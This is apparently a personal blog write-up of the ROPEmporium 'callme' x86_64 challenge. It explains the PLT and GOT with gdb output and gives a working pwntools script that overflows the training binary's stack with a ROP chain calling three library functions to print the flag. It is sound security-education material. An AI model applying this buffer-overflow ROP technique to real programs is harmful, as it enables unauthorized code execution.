---
layout: post
title: Week 7 - Callme ROPEmporium x86_64
tags: [year-of-hacking, CTF, writeup]
---
Alongside the target binary, we get a file called `libcallme.so`, and we get some instructions:
```
You must call the `callme_one()`, `callme_two()` and `callme_three()` functions in that order, each with the arguments `0xdeadbeef`, `0xcafebabe`, `0xd00df00d` e.g. `callme_one(0xdeadbeef, 0xcafebabe, 0xd00df00d)` to print the flag. **For the x86_64 binary** double up those values, e.g. `callme_one(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)`
```

Looks like our target goal is to make this code run:
```C
callme_one(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)
callme_two(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)
callme_three(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)
```

Also, running the `file` command, we can see that this isn't an executable, it's a shared library:
```
{21:23}~/ctf/ROPEmporium/callme ➭ file libcallme.so
libcallme.so: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, BuildID[sha1]=be0ff85ee2d8ff280e7bc612bb2a2709737e8881, not stripped
```

Loading up the binary into `gdb`, we can see all the function stubs using `info functions`:
```
0x00000000004006a8  _init
...
0x00000000004006f0  callme_three@plt
0x0000000000400700  memset@plt
0x0000000000400710  read@plt
0x0000000000400720  callme_one@plt
0x0000000000400730  setvbuf@plt
0x0000000000400740  callme_two@plt
...
0x00000000004009b4  _fini
```

We can see what happens in one of the functions by using `disas callme_one`:
```
gef➤  disas callme_one
Dump of assembler code for function callme_one@plt:
   0x0000000000400720 <+0>:     jmp    QWORD PTR [rip+0x20091a]        # 0x601040 <callme_one@got.plt>   0x0000000000400726 <+6>:     push   0x5
   0x000000000040072b <+11>:    jmp    0x4006c0
End of assembler dump.
```

This doesn't look like a typical file! It looks likes it jumps to something called  `callme_one@got.plt`. Time to learn what `plt` and `got` are.

After some reading, I learned a few things. `PLT` stands for `Procedural Linkage Table`, and `GOT` stands for `Global Offset Table`, both being 2 data structures that work together to link functions in a binary. To my understanding, there exists a standard ABI (Application Binary Interface) of functions called `libc`, with the most popular implementation being `glibc` by the GNU project, which of course is packaged with the Linux kernel. These include `printf`, `malloc`, `fopen`, and `bind`. In order to run these functions, they need to be loaded into memory. However, because these basic functions are used in basically every program, it would waste a lot of memory to load every function for every program. 

The solution to this is the Global Offset Table (`got`) and Procedural Linkage Table (`plt`). At compile time, when the compiler reaches an external function, it will save the function stub in the PLT to be filled in dynamically by the linker. During execution, the program will call the function through the PLT. The function entry in the PLT will always be in the same place in memory, but the address it resolves to is not static, but will instead point to where that function is stored in the shared memory of the entire operating system. This means that every program will access the same piece of memory to execute a common function.

The Global Offset Table (`got`) solves a similar problem but for global variables. What I'm not exactly clear on is if that's for variables that are shared between programs. I've made a note to learn more about this later.

Let's solidify this by looking at a simple program:
```
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char** argv) {
	printf("%s\n", "Hello world!");
	exit(0);
}
```

And compile it with
```
gcc test.c -o test
```

Let's load it into `gdb` and run `info functions`:
```
gef➤  info functions
All defined functions:

Non-debugging symbols:
0x0000000000001000  _init
0x0000000000001030  puts@plt
0x0000000000001040  exit@plt
...
0x0000000000001174  _fini
```

Though I called `printf`, it actually only calls `puts`. My best guess is that the compiler recognized that there was no variability in the content that it would have printed, so it optimized the program to use the less resource intensive `puts`.

Dropping a breakpoint at main with `b main` and advancing until the first call to the PLT, we can see the PLT in action:
```
→ 0x555555555162 <main+25>        call   0x555555555030 <puts@plt>
   ↳  0x555555555030 <puts@plt+0>     jmp    QWORD PTR [rip+0x2fca]
      0x555555555036 <puts@plt+6>     push   0x0
      0x55555555503b <puts@plt+11>    jmp    0x555555555020
      0x555555555040 <exit@plt+0>     jmp    QWORD PTR [rip+0x2fc2]
      0x555555555046 <exit@plt+6>     push   0x1
      0x55555555504b <exit@plt+11>    jmp    0x555555555020
```

It looks like it jumps to the `puts` PLT entry, which has the memory address `0x1030`, with `0x555555554000` being the base memory address. When we step into the function, we see it jumps around a bit before finally going to the actual code of the function:

```
→ 0x555555555030 <puts@plt+0>     jmp    QWORD PTR [rip+0x2fca]
...
→ 0x555555555026                  jmp    QWORD PTR [rip+0x2fcc]
...
→ 0x7ffff7fdd550 <_dl_runtime_resolve_xsavec+0> push   rbx
```

The address `0x7ffff7fdd550` is the start of the `puts` call that is outside of the bounds of the program, and instead the processor is running code from the instance of `puts` that is shared by all programs.

In the context of this program, it looks like the program uses the `libcallme.so` to provide the custom `callme_one`, `two`, and `three` functions. We can actually use `gdb` to load up the shared object:
```
gef➤  info functions
All defined functions:

Non-debugging symbols:
0x0000000000000690  _init
...
0x000000000000081a  callme_one
0x000000000000092b  callme_two
0x0000000000000a2d  callme_three
0x0000000000000b98  _fini
gef➤ disas callme_one
Dump of assembler code for function callme_one:
   0x000000000000081a <+0>:     push   rbp
   0x000000000000081b <+1>:     mov    rbp,rsp
   0x000000000000081e <+4>:     sub    rsp,0x30
   0x0000000000000822 <+8>:     mov    QWORD PTR [rbp-0x18],rdi
   0x0000000000000826 <+12>:    mov    QWORD PTR [rbp-0x20],rsi
   0x000000000000082a <+16>:    mov    QWORD PTR [rbp-0x28],rdx
```

Now for the exploitation. Thankfully, `pwntools` is really really really smart, as I discovered in the [last time I did a ROPEmporium challenge](https://jake-mullins.github.io/year-of-hacking-0x4). The syntax for ROP in `pwntools` is really clean:

```python
#!/usr/bin/env python3
from pwn import *
  
binary = './callme'
elf = context.binary = ELF(binary, checksec=False)
  
gs = """
b *(callme_one)
b *(callme_two)
b *(callme_three)
c
"""
  
if args.GDB:
    context.terminal = ["tmux", "splitw", "-h", "-l", "120"]
    p = gdb.debug(binary, gdbscript=gs)
else:
    p = elf.process()
  
callme_one_addr = elf.symbols['plt.callme_one']
callme_two_addr = elf.symbols['plt.callme_two']
callme_three_addr = elf.symbols['plt.callme_three']

rop = ROP(binary)
rop.call(callme_one_addr, [0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d])
rop.call(callme_two_addr, [0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d])
rop.call(callme_three_addr, [0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d])
print(rop.dump())
  
padding = b"A" * 40
payload = padding + rop.chain()
  
with open('payload.bin', 'wb') as f:
    f.write(payload)
  
p.recvuntil(b'> ').decode().rstrip()
p.sendline(payload)
print(p.recv().decode().rstrip())
print(p.recv().decode().rstrip())
  
# p.interactive()
```

Running this script yields the flag!:
```bash
{0:04}~/ctf/ROPEmporium/callme ➭ python3 attack.py
[+] Starting local process '/home/jakemull/ctf/ROPEmporium/callme/callme': pid 2179
[*] '/home/jakemull/ctf/ROPEmporium/callme/callme'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
[*] Loaded 17 cached gadgets for './callme'
0x0000:         0x40093c pop rdi; pop rsi; pop rdx; ret
0x0008: 0xdeadbeefdeadbeef [arg0] rdi = 16045690984833335023
0x0010: 0xcafebabecafebabe [arg1] rsi = 14627333968358193854
0x0018: 0xd00df00dd00df00d [arg2] rdx = 14991902676702064653
0x0020:         0x400720
0x0028:         0x40093c pop rdi; pop rsi; pop rdx; ret
0x0030: 0xdeadbeefdeadbeef [arg0] rdi = 16045690984833335023
0x0038: 0xcafebabecafebabe [arg1] rsi = 14627333968358193854
0x0040: 0xd00df00dd00df00d [arg2] rdx = 14991902676702064653
0x0048:         0x400740
0x0050:         0x40093c pop rdi; pop rsi; pop rdx; ret
0x0058: 0xdeadbeefdeadbeef [arg0] rdi = 16045690984833335023
0x0060: 0xcafebabecafebabe [arg1] rsi = 14627333968358193854
0x0068: 0xd00df00dd00df00d [arg2] rdx = 14991902676702064653
0x0070:         0x4006f0
Thank you!
[*] Process '/home/jakemull/ctf/ROPEmporium/callme/callme' stopped with exit code 0 (pid 2179)
callme_one() called correctly
callme_two() called correctly
ROPE{a_placeholder_32byte_flag!}
```

This was my first foray into binary exploitation that involves a shared object. I'll probably continue with ROPEmporium.
